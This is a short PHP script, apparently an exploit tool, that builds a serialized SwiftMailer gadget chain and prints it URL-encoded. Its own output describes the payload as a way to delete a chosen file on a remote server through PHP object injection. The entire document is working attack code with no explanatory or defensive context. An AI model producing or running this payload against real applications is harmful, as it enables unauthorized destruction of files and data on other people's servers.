<?php
class Swift_ByteStream_TemporaryFileByteStream extends Swift_ByteStream_FileByteStream {
    public function __construct($path) {
        parent::__construct($path);
    }
}

class Swift_ByteStream_FileByteStream {
    private $path;
    public function __construct($path) {
        $this->path = $path;
    }
}

if ($argc != 2) {
    echo "Usage: php $argv[0] <remote_path>";
    exit;
}

$path    = $argv[1];
$obj     = new Swift_ByteStream_TemporaryFileByteStream($path);
$payload = serialize($obj);

echo "[+] SwiftMailer POP chain to delete file at remote: $path\n";
echo "[+] urlencode(\$payload):\n";
echo urlencode($payload) . "\n";